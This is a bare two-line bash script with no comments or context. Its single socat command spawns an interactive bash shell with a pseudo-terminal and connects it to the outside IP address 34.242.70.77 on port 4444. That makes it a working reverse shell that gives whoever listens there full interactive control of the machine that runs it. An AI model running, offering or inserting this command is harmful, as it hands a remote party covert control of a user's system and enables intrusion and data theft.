#!/bin/bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:34.242.70.77:4444
